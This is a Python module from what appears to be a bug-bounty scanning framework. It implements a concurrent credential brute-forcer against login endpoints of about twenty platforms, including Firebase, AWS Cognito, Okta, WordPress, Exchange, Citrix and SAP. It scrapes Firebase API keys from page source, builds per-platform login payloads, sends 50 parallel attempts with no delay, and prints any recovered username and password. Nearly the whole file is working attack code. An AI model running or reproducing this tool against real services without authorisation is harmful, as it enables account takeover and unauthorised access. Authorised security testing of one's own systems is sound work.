import asyncio
import sys
from typing import List, Dict, Optional, Tuple, Set
from core.base_module import BaseModule, Finding
from pathlib import Path
import json
import urllib.request
import urllib.error
import urllib.parse
import base64
import re


class CredentialTester(BaseModule):
    """Universal brute force module - supports 20+ authentication types"""

    def __init__(self, config, stealth=None, db=None, graph_manager=None):
        super().__init__(config, stealth, db, graph_manager)
        self.max_attempts    = config.get('max_attempts', 1000)
        self.delay           = 0
        self.wordlist_path   = config.get('wordlist_path', 'wordlists')
        self.concurrency     = config.get('concurrency', 50)
        self.custom_userlist  = config.get('userlist', None)
        self.custom_passlist  = config.get('passlist', None)
        self._max_usernames   = config.get('max_usernames', 200)
        self._max_passwords   = config.get('max_passwords', 2000)

    def _print_progress(self, current: int, total: int, prefix: str = 'Progress', width: int = 40):
        if total == 0:
            return
        pct   = current / total
        filled = int(width * pct)
        bar   = '█' * filled + '░' * (width - filled)
        line  = f'\r\033[96m{prefix}:\033[0m [{bar}] \033[93m{pct*100:5.1f}%\033[0m  {current}/{total}'
        sys.stdout.write(line)
        sys.stdout.flush()
        if current >= total:
            sys.stdout.write('\n')
            sys.stdout.flush()

    async def run(self, target: str, **kwargs) -> List[Finding]:
        if not kwargs.get('enable_brute_force', False):
            return self.findings

        if kwargs.get('userlist'):      self.custom_userlist = kwargs['userlist']
        if kwargs.get('passlist'):      self.custom_passlist = kwargs['passlist']
        if kwargs.get('max_usernames'): self._max_usernames  = kwargs['max_usernames']
        if kwargs.get('max_passwords'): self._max_passwords  = kwargs['max_passwords']

        target_url = target if target.startswith(('http://', 'https://')) else f"https://{target}"

        print(f"\033[96m[*] Target URL: {target_url}\033[0m")

        # Check if direct Firebase URL provided
        if 'identitytoolkit.googleapis.com' in target_url:
            print(f"\033[92m[+] Using Firebase Identity Toolkit URL directly\033[0m")
            endpoint = {
                'url': target_url,
                'auth_type': 'firebase',
                'fields': {'username_fields': ['email'], 'password_field': 'password'}
            }
        else:
            # Check if it's a Firebase hosting URL that needs API key extraction
            detected_type = self._detect_auth_type(target_url)
            
            if detected_type == 'firebase':
                print(f"\033[96m[*] Firebase hosting detected, extracting API key...\033[0m")
                firebase_url = await self._extract_firebase_endpoint(target_url)
                
                if firebase_url:
                    print(f"\033[92m[+] Firebase Identity Toolkit endpoint: {firebase_url}\033[0m")
                    endpoint = {
                        'url': firebase_url,
                        'auth_type': 'firebase',
                        'fields': {'username_fields': ['email'], 'password_field': 'password'}
                    }
                else:
                    print(f"\033[93m[!] Could not extract Firebase API key, trying universal brute force on HTML page\033[0m")
                    endpoint = {
                        'url': target_url,
                        'auth_type': 'universal',
                        'fields': {'username_fields': ['email', 'username'], 'password_field': 'password'}
                    }
            elif detected_type:
                print(f"\033[92m[+] Detected auth type: {detected_type}\033[0m")
                endpoint = {
                    'url': target_url,
                    'auth_type': detected_type,
                    'fields': {'username_fields': ['email', 'username'], 'password_field': 'password'}
                }
            else:
                print(f"\033[93m[!] No specific auth type detected, using universal brute force\033[0m")
                endpoint = {
                    'url': target_url,
                    'auth_type': 'universal',
                    'fields': {'username_fields': ['email', 'username', 'user', 'login'], 'password_field': 'password'}
                }

        ulist_label = self.custom_userlist or f"{self.wordlist_path}/usernames.txt"
        plist_label = self.custom_passlist or f"{self.wordlist_path}/passwords.txt"
        print(f"\033[96m[*] Userlist : {ulist_label}\033[0m")
        print(f"\033[96m[*] Passlist : {plist_label}\033[0m\n")

        await self._test_brute_force(endpoint)
        return self.findings

    def _detect_auth_type(self, url: str) -> Optional[str]:
        """Detect authentication type from URL patterns"""
        url_lower = url.lower()
        
        # Firebase patterns (web.app, firebaseapp.com, etc.)
        if any(kw in url_lower for kw in ['web.app', 'firebaseapp.com', 'firebase', 'identitytoolkit']):
            return 'firebase'
        
        patterns = {
            'aws_cognito': ['cognito', 'amazoncognito', 'aws.amazon.com'],
            'auth0': ['auth0.com', 'auth0'],
            'okta': ['okta.com', 'oktapreview', 'okta-emea'],
            'keycloak': ['keycloak', 'auth/realms'],
            'jwt': ['/jwt', '/token', 'api/token', 'auth/token'],
            'oauth2': ['/oauth', '/oauth2', 'authorize', 'access_token'],
            'graphql': ['/graphql', '/gql', 'api/graphql'],
            'wordpress': ['wp-login', 'wp-admin', 'wordpress'],
            'drupal': ['/user/login', 'drupal'],
            'joomla': ['/administrator', 'joomla'],
            'django': ['/admin', 'django', 'csrfmiddlewaretoken'],
            'rails': ['/users/sign_in', 'authenticity_token'],
            'spring': ['/login', 'spring-security', 'j_spring_security_check'],
            'sap': ['/sap', 'sap-system-login'],
            'sharepoint': ['sharepoint', '_layouts/authenticate'],
            'exchange': ['/owa', 'exchange', 'outlook'],
            'citrix': ['/citrix', 'nfauth'],
            'vmware': ['/ui', 'vmware', 'vsphere'],
            'basic_auth': ['basic', 'auth'],
            'xml_soap': ['/soap', '/ws/', '/wsdl', '/service'],
        }
        
        for auth_type, keywords in patterns.items():
            if any(kw in url_lower for kw in keywords):
                return auth_type
        
        return None

    async def _extract_firebase_endpoint(self, url: str) -> Optional[str]:
        """Extract Firebase API key from page and construct Identity Toolkit endpoint"""
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=15) as response:
                html = response.read().decode('utf-8', errors='ignore')
            
            api_key = None
            
            # Look for apiKey in various formats
            patterns = [
                r'apiKey["\'\s]*[:=]["\'\s]*([A-Za-z0-9_-]{39})',
                r'apiKey:\s*["\']([A-Za-z0-9_-]{39})["\']',
                r'"apiKey":\s*"([A-Za-z0-9_-]{39})"',
                r'apiKey\s*=\s*["\']([A-Za-z0-9_-]{39})["\']',
                r'AIza[0-9A-Za-z_-]{35}',  # Direct API key pattern (39 chars starting with AIza)
            ]
            
            for pattern in patterns:
                match = re.search(pattern, html)
                if match:
                    api_key = match.group(1) if match.groups() else match.group(0)
                    # Clean up the key if needed
                    api_key = api_key.strip().strip('"\'')
                    print(f"\033[92m[+] Found Firebase API key in page source\033[0m")
                    break
            
            # If not found in HTML, check linked JS files
            if not api_key:
                js_files = re.findall(r'src=["\']([^"\']+\.js)["\']', html)
                if js_files:
                    print(f"\033[96m[*] Scanning {len(js_files)} JS file(s) for API key...\033[0m")
                    
                    for js_path in js_files[:10]:
                        try:
                            js_url = js_path if js_path.startswith('http') else urllib.parse.urljoin(url, js_path)
                            js_req = urllib.request.Request(js_url, headers={'User-Agent': 'Mozilla/5.0'})
                            with urllib.request.urlopen(js_req, timeout=10) as js_response:
                                js_content = js_response.read().decode('utf-8', errors='ignore')
                            
                            for pattern in patterns:
                                match = re.search(pattern, js_content)
                                if match:
                                    api_key = match.group(1) if match.groups() else match.group(0)
                                    api_key = api_key.strip().strip('"\'')
                                    print(f"\033[92m[+] Found API key in {js_path}\033[0m")
                                    break
                            
                            if api_key:
                                break
                        except Exception:
                            continue
            
            if api_key:
                # Validate API key format (should be 39 chars starting with AIza)
                if len(api_key) >= 35 and api_key.startswith('AIza'):
                    firebase_url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={api_key}"
                    return firebase_url
                else:
                    print(f"\033[93m[!] Invalid API key format found: {api_key[:10]}...\033[0m")
            
            return None
            
        except Exception as e:
            self.logger.debug(f"Failed to extract Firebase config: {e}")
            return None

    def _load_wordlists(self) -> Tuple[List[str], List[str]]:
        usernames: List[str] = []
        passwords: List[str] = []

        MAX_U = getattr(self, '_max_usernames', 200)
        MAX_P = getattr(self, '_max_passwords', 2000)

        def _load_capped(path, label, cap):
            lines = []
            with open(path, 'r', errors='ignore') as fh:
                for line in fh:
                    s = line.strip()
                    if s:
                        lines.append(s)
                    if len(lines) >= cap:
                        break
            flag = f' \033[91m(capped)\033[0m' if len(lines) == cap else ''
            print(f"\033[92m[+] {label}: {path} ({len(lines)} entries{flag})\033[0m")
            return lines

        import os
        cwd = Path(os.getcwd())

        def _resolve(raw_path: str) -> Optional[Path]:
            candidates = [
                Path(raw_path),
                cwd / raw_path,
                Path(raw_path).expanduser(),
            ]
            for c in candidates:
                try:
                    if c.exists():
                        return c.resolve()
                except Exception:
                    pass
            return None

        if self.custom_userlist:
            upath = _resolve(self.custom_userlist)
            if upath:
                usernames = _load_capped(upath, 'Custom userlist', MAX_U)
            else:
                print(f"\033[91m[!] Userlist not found: '{self.custom_userlist}'\033[0m")

        if not usernames:
            upath = _resolve(str(Path(self.wordlist_path) / 'usernames.txt'))
            if upath:
                usernames = _load_capped(upath, 'Userlist (default)', MAX_U)
            else:
                usernames = ['admin', 'administrator', 'user', 'test', 'root', 'admin@email.com']
                print(f"\033[93m[!] No userlist found — using {len(usernames)} built-in defaults\033[0m")

        if self.custom_passlist:
            ppath = _resolve(self.custom_passlist)
            if ppath:
                passwords = _load_capped(ppath, 'Custom passlist', MAX_P)
            else:
                print(f"\033[91m[!] Passlist not found: '{self.custom_passlist}'\033[0m")

        if not passwords:
            ppath = _resolve(str(Path(self.wordlist_path) / 'passwords.txt'))
            if ppath:
                passwords = _load_capped(ppath, 'Passlist (default)', MAX_P)
            else:
                passwords = ['admin', 'password', '123456', 'login', 'admin123']
                print(f"\033[93m[!] No passlist found — using {len(passwords)} built-in defaults\033[0m")

        print()
        return usernames, passwords

    def _build_payload(self, auth_type: str, username: str, password: str, url: str) -> Dict:
        """Build request payload based on auth type"""
        result = {
            'url': url,
            'method': 'POST',
            'headers': {},
            'data': None,
            'use_json': False,
            'use_basic_auth': False,
            'basic_auth_tuple': None
        }

        # Firebase / Google Identity Toolkit
        if auth_type == 'firebase':
            result['data'] = {
                'email': username,
                'password': password,
                'returnSecureToken': True
            }
            result['use_json'] = True
            result['headers']['Content-Type'] = 'application/json'

        # AWS Cognito
        elif auth_type == 'aws_cognito':
            result['data'] = {
                'AuthFlow': 'USER_PASSWORD_AUTH',
                'ClientId': self._extract_cognito_client_id(url),
                'AuthParameters': {
                    'USERNAME': username,
                    'PASSWORD': password
                }
            }
            result['use_json'] = True
            result['headers']['Content-Type'] = 'application/x-amz-json-1.1'
            result['headers']['X-Amz-Target'] = 'AWSCognitoIdentityProviderService.InitiateAuth'

        # Auth0
        elif auth_type == 'auth0':
            result['data'] = {
                'grant_type': 'password',
                'username': username,
                'password': password,
                'audience': url,
                'scope': 'openid profile'
            }
            result['use_json'] = True
            result['headers']['Content-Type'] = 'application/json'

        # Okta
        elif auth_type == 'okta':
            result['data'] = {
                'username': username,
                'password': password,
                'options': {
                    'multiOptionalFactorEnroll': False,
                    'warnBeforePasswordExpired': False
                }
            }
            result['use_json'] = True
            result['headers']['Content-Type'] = 'application/json'
            result['headers']['Accept'] = 'application/json'

        # Keycloak
        elif auth_type == 'keycloak':
            result['data'] = {
                'grant_type': 'password',
                'client_id': 'admin-cli',
                'username': username,
                'password': password
            }
            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'

        # JWT / Token endpoint
        elif auth_type == 'jwt':
            result['data'] = {
                'username': username,
                'password': password,
                'grant_type': 'password'
            }
            result['use_json'] = True
            result['headers']['Content-Type'] = 'application/json'

        # OAuth2
        elif auth_type == 'oauth2':
            result['data'] = {
                'grant_type': 'password',
                'username': username,
                'password': password,
                'scope': 'read write'
            }
            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'

        # GraphQL
        elif auth_type == 'graphql':
            mutation = f'mutation {{ login(input: {{email: "{username}", password: "{password}"}}) {{ token user {{ id email }} }} }}'
            result['data'] = {'query': mutation}
            result['use_json'] = True
            result['headers']['Content-Type'] = 'application/json'

        # WordPress
        elif auth_type == 'wordpress':
            result['data'] = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': '/wp-admin/',
                'testcookie': '1'
            }
            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
            result['headers']['Cookie'] = 'wordpress_test_cookie=WP+Cookie+check'

        # Drupal
        elif auth_type == 'drupal':
            result['data'] = {
                'name': username,
                'pass': password,
                'form_id': 'user_login_form',
                'op': 'Log in'
            }
            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'

        # Joomla
        elif auth_type == 'joomla':
            result['data'] = {
                'username': username,
                'passwd': password,
                'task': 'login',
                'option': 'com_users'
            }
            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'

        # Django
        elif auth_type == 'django':
            result['data'] = {
                'username': username,
                'password': password,
                'csrfmiddlewaretoken': 'placeholder'
            }
            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'

        # Ruby on Rails
        elif auth_type == 'rails':
            result['data'] = {
                'user[email]': username,
                'user[password]': password,
                'authenticity_token': 'placeholder'
            }
            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'

        # Spring Security
        elif auth_type == 'spring':
            result['data'] = {
                'j_username': username,
                'j_password': password,
                'submit': 'Login'
            }
            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'

        # SAP
        elif auth_type == 'sap':
            result['data'] = {
                'j_user': username,
                'j_password': password,
                'sap-system-login': 'on'
            }
            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'

        # SharePoint
        elif auth_type == 'sharepoint':
            result['data'] = {
                'ctl00$PlaceHolderMain$signInControl$UserName': username,
                'ctl00$PlaceHolderMain$signInControl$Password': password
            }
            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'

        # Exchange / OWA
        elif auth_type == 'exchange':
            result['data'] = {
                'username': username,
                'password': password,
                'trusted': '4'
            }
            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'

        # Citrix
        elif auth_type == 'citrix':
            result['data'] = {
                'login': username,
                'passwd': password,
                'nsg-user-login': 'true'
            }
            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'

        # VMware vSphere
        elif auth_type == 'vmware':
            result['data'] = {
                'userName': username,
                'password': password
            }
            result['use_json'] = True
            result['headers']['Content-Type'] = 'application/json'

        # Basic Auth
        elif auth_type == 'basic_auth':
            result['use_basic_auth'] = True
            result['basic_auth_tuple'] = (username, password)
            result['method'] = 'GET'

        # XML/SOAP
        elif auth_type == 'xml_soap':
            result['data'] = f'''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Login xmlns="http://tempuri.org/">
      <username>{username}</username>
      <password>{password}</password>
    </Login>
  </soap:Body>
</soap:Envelope>'''
            result['headers']['Content-Type'] = 'text/xml; charset=utf-8'
            result['headers']['SOAPAction'] = '"Login"'

        # Universal / Default - try common formats
        else:
            result['data'] = {
                'email': username,
                'password': password
            }
            result['use_json'] = True
            result['headers']['Content-Type'] = 'application/json'

        return result

    def _extract_cognito_client_id(self, url: str) -> str:
        """Extract AWS Cognito Client ID from URL or return placeholder"""
        match = re.search(r'client_id=([a-z0-9]+)', url, re.IGNORECASE)
        if match:
            return match.group(1)
        return 'PLACEHOLDER_CLIENT_ID'

    async def _test_brute_force(self, endpoint: Dict):
        import itertools

        url = endpoint['url']
        auth_type = endpoint.get('auth_type', 'universal')
        fields = endpoint.get('fields', {})
        
        base_usernames, passwords = self._load_wordlists()
        all_usernames = list(dict.fromkeys(base_usernames))
        total_attempts = len(all_usernames) * len(passwords)

        semaphore = asyncio.Semaphore(self.concurrency)
        found_event = asyncio.Event()
        rate_limited = [False]
        counter = [0]

        print(f"\033[96m[*] Auth Type : {auth_type}\033[0m")
        print(f"\033[96m[*] Target    : {url}\033[0m")
        print(f"\033[96m[*] Usernames : {len(all_usernames)}\033[0m")
        print(f"\033[96m[*] Passwords : {len(passwords)}\033[0m")
        print(f"\033[96m[*] Total     : {total_attempts}\033[0m\n")

        async def attempt(username: str, password: str):
            if found_event.is_set():
                return
            async with semaphore:
                if found_event.is_set():
                    return
                try:
                    loop = asyncio.get_event_loop()

                    def do_request():
                        config = self._build_payload(auth_type, username, password, url)
                        
                        try:
                            if config.get('use_basic_auth'):
                                auth_str = base64.b64encode(
                                    f"{config['basic_auth_tuple'][0]}:{config['basic_auth_tuple'][1]}".encode()
                                ).decode()
                                req = urllib.request.Request(
                                    config['url'],
                                    headers={
                                        'Authorization': f'Basic {auth_str}',
                                        'User-Agent': 'Mozilla/5.0'
                                    },
                                    method=config['method']
                                )
                                with urllib.request.urlopen(req, timeout=15) as r:
                                    return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), auth_type
                            
                            else:
                                data = config['data']
                                if config.get('use_json'):
                                    body = json.dumps(data).encode('utf-8')
                                else:
                                    body = urllib.parse.urlencode(data).encode('utf-8')
                                
                                req = urllib.request.Request(
                                    config['url'],
                                    data=body,
                                    headers={**config['headers'], 'User-Agent': 'Mozilla/5.0'},
                                    method=config['method']
                                )
                                with urllib.request.urlopen(req, timeout=15) as r:
                                    return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), auth_type
                                    
                        except urllib.error.HTTPError as e:
                            return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), auth_type
                        except Exception as ex:
                            return 0, str(ex), {}, auth_type

                    status, text, resp_headers, used_format = await loop.run_in_executor(None, do_request)
                    tl = text.lower()

                    counter[0] += 1
                    self._print_progress(counter[0], total_attempts,
                                         prefix=f'  \033[96m{username[:22]:<22}\033[0m')

                    if counter[0] == 1:
                        sys.stdout.write('\n')
                        print(f"\033[90m[debug] HTTP {status} | Format: {used_format} | {text[:300]}\033[0m\n")

                    if status == 429:
                        rate_limited[0] = True
                        found_event.set()
                        return

                    is_success = False

                    # Firebase success detection
                    if auth_type == 'firebase':
                        if 'idtoken' in tl or 'id_token' in tl:
                            if not any(err in tl for err in ['invalid', 'error', 'failed']):
                                is_success = True
                        elif 'registered' in tl and 'true' in tl:
                            is_success = True
                        # Also check for error indicating wrong password vs invalid user
                        elif 'INVALID_PASSWORD' in text:
                            pass  # Wrong password, but user exists
                        elif 'EMAIL_NOT_FOUND' in text:
                            pass  # User doesn't exist
                    
                    elif auth_type == 'aws_cognito':
                        if 'accessToken' in tl or 'idToken' in tl or 'AuthenticationResult' in tl:
                            is_success = True
                    
                    elif auth_type == 'auth0':
                        if 'access_token' in tl or 'id_token' in tl:
                            is_success = True
                    
                    elif auth_type == 'okta':
                        if 'sessionToken' in tl or ('status' in tl and 'success' in tl):
                            is_success = True
                    
                    elif auth_type == 'jwt' or auth_type == 'oauth2':
                        if 'access_token' in tl or 'token' in tl:
                            if not any(err in tl for err in ['invalid', 'error', 'unauthorized']):
                                is_success = True
                    
                    elif auth_type == 'wordpress':
                        if status in [301, 302] and 'wp-admin' in resp_headers.get('Location', '').lower():
                            is_success = True
                        if 'dashboard' in tl or 'wp-admin' in tl:
                            is_success = True
                    
                    elif auth_type == 'basic_auth' or auth_type == 'digest_auth':
                        if status == 200:
                            is_success = True
                    
                    # Universal success indicators
                    if not is_success:
                        if any(k in tl for k in ['token', 'access_token', 'session', 'authenticated', 'success', 'welcome', 'dashboard']):
                            if not any(err in tl for err in ['invalid', 'error', 'failed', 'wrong', 'denied', 'unauthorized']):
                                is_success = True
                        
                        # Redirect to non-login page
                        if status in [301, 302, 303]:
                            location = resp_headers.get('Location', '').lower()
                            if location and not any(p in location for p in ['login', 'signin', 'error', 'fail', 'denied', 'auth']):
                                is_success = True

                    if is_success:
                        sys.stdout.write('\n')
                        self._report_success(username, password, url, counter[0],
                                             [auth_type], 'password')
                        found_event.set()

                except asyncio.CancelledError:
                    raise
                except Exception:
                    counter[0] += 1

        tasks = [asyncio.create_task(attempt(u, p))
                 for u, p in itertools.product(all_usernames, passwords)]
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except (KeyboardInterrupt, asyncio.CancelledError):
            for t in tasks: t.cancel()
            sys.stdout.write('\n')
            print(f"\033[93m[!] Interrupted after {counter[0]} attempts\033[0m")
            return

        sys.stdout.write('\n')
        if rate_limited[0]:
            self._add_rate_limit_finding(url, counter[0])
        elif not found_event.is_set():
            print(f"\033[93m[-] No credentials found after {counter[0]} attempts\033[0m")

    def _report_success(self, username, password, url, attempts, username_fields, password_field):
        sep = "=" * 60
        print(f"\n\033[91m{sep}\033[0m")
        print(f"\033[92m[!!!] CREDENTIALS FOUND!\033[0m")
        print(f"\033[92m      Username : {username}\033[0m")
        print(f"\033[92m      Password : {password}\033[0m")
        print(f"\033[92m      URL      : {url}\033[0m")
        print(f"\033[92m      Attempts : {attempts}\033[0m")
        print(f"\033[91m{sep}\033[0m\n")
        self.add_finding(Finding(
            module='brute_force',
            title=f'[CREDENTIALS FOUND] {username}:{password} @ {url}',
            severity='Critical',
            description=f'Successfully brute-forced login at {url}\nUsername: {username}\nPassword: {password}\nAttempts: {attempts}',
            evidence={'username': username, 'password': password, 'url': url, 'attempts': attempts},
            poc=f"curl -X POST '{url}' -d 'email={username}&password={password}'",
            remediation='Implement strong password policy, rate limiting, and account lockout',
            cvss_score=9.8, bounty_score=5000, target=url))

    def _add_rate_limit_finding(self, url, attempts):
        self.add_finding(Finding(
            module='brute_force', title='Rate Limiting Detected During Brute Force',
            severity='Info',
            description=f'Rate limiting triggered after {attempts} attempts',
            evidence={'attempts': attempts, 'url': url},
            poc=f"Send {attempts} login requests to {url}",
            remediation='Rate limiting is working correctly',
            cvss_score=0.0, bounty_score=0, target=url))
